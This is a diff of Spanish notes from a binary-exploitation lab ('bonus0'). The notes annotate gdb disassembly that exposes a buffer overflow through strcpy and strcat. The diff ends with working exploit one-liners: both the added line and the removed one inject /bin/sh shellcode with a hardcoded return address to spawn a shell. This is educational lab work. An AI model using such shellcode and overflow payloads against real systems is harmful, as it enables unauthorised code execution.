@@ -1,12 +1,18 @@
 1.- Analizamos con gdb y encontramos dos funciones a parte de main() que son pp() y p()
 
   main() -> pp(char *dest) -> p(char *dest, char *s)
+                  |
+                  ----------> p(char *dest, char *s)
 
   main()
   [...]
-  0x080485b1 <+13>:    mov    DWORD PTR [esp],eax
-  0x080485b4 <+16>:    call   0x804851e <pp>
-  0x080485b9 <+21>:    lea    eax,[esp+0x16]
+  0x080485ad <+9>:	   lea    eax,[esp+0x16]        
+  0x080485b1 <+13>:    mov    DWORD PTR [esp],eax     ;carga un puntero en esp
+  0x080485b4 <+16>:    call   0x804851e <pp>          ;llama a pp() con el parámetro del puntero
+  [...]
+  0x080485b9 <+21>:	lea    eax,[esp+0x16]
+  0x080485bd <+25>:	mov    DWORD PTR [esp],eax
+  0x080485c0 <+28>:	call   0x80483b0 <puts@plt>       ;hace un puts con el puntero que le ha pasado a pp
   [...]
 
 2.- A la función pp() main() le pasa como argumento un char* de 42 bytes
@@ -34,7 +40,6 @@
   0x08048544 <+38>:    mov    DWORD PTR [esp],eax
   0x08048547 <+41>:    call   0x80484b4 <p>                   ;llamada a p(*str2)
   [...]
-
 
 4.- Lo primero que hace p() es imprimir el 2º parametro que le manda pp() y es una cadean " - "
   [...]
@@ -77,19 +82,46 @@
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   [...]
 
-8.- Volvemos a la función pp(). Copia por medio de strcpy() el primer puntero obtenido por p() a dest que se le pasa como parámetro a pp()
+8.- Volvemos a la función pp(). Copia por medio de strcpy() el primer puntero obtenido por p() a buff que se le pasa como parámetro a pp()
   
   pp()
   [...]
-  0x0804854c <+46>:	lea    eax,[ebp-0x30]             ;str del parametro de pp(str)
+  0x0804854c <+46>:	lea    eax,[ebp-0x30]             ;str de la primera llamanda a p(str1, " - ")
   0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
-  0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]    ;la str 
+  0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]    ;la str de la llamada de pp(buff)
   0x08048556 <+56>:	mov    DWORD PTR [esp],eax
-  0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
+  0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>     ;strcpy(buff, str1)
   [...]
 
-8.- 
+9.- Luego continua haciendo alguna operación
+  [...]
+  0x0804855e <+64>:	mov    ebx,0x80486a4                      ;0x80486a4 = " "
+  0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]            ;eax = buff
+  0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff    ;ebp-0x3c = -1 se usa para el contador de repnz <+91>
+  0x0804856d <+79>:	mov    edx,eax                            ;edx = buff
+  0x0804856f <+81>:	mov    eax,0x0
+  0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]           ;ecx = -1
+  0x08048577 <+89>:	mov    edi,edx 
+  0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]           ;esto es un strlen(buff) 
+  0x0804857b <+93>:	mov    eax,ecx                            ;ecx = -(strlen(buff) + 1)
+  0x0804857d <+95>:	not    eax                                ;invierte eax que ahora es strlen(buff)
+  0x0804857f <+97>:	sub    eax,0x1                            ;le resta 1
+  0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]          ;ahora eax apunta a la última posicion de buff
+  0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]               ;edx = " "
+  0x08048588 <+106>:	mov    WORD PTR [eax],dx                ;se escribe en el final del buffer " "
+  [...]
+
+10.- Prepara la llamada a strcat(buff, str2)
+  [...]
+  0x0804858b <+109>:	lea    eax,[ebp-0x1c]               ;donde está almacenada str2
+  0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax      
+  0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]      ;buff
+  0x08048595 <+119>:	mov    DWORD PTR [esp],eax
+  0x08048598 <+122>:	call   0x8048390 <strcat@plt>
+  [...]
   
 
+ltrace -> ver direccion donde devuelve la funcion strcpy() en pp()
+(python2 -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd"'; python2 -c 'print "\x80" + "A"*13 + "\x46\xfc\xff\xbf" + "A"'; cat -) | ./bonus0
 
-(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0")'; python -c 'print("\x0b\xcd\x80" + "a"*11 + "\xbf\xff\xf6\xf6"[::-1] + "a")'; cat - )| ./bonus0
+
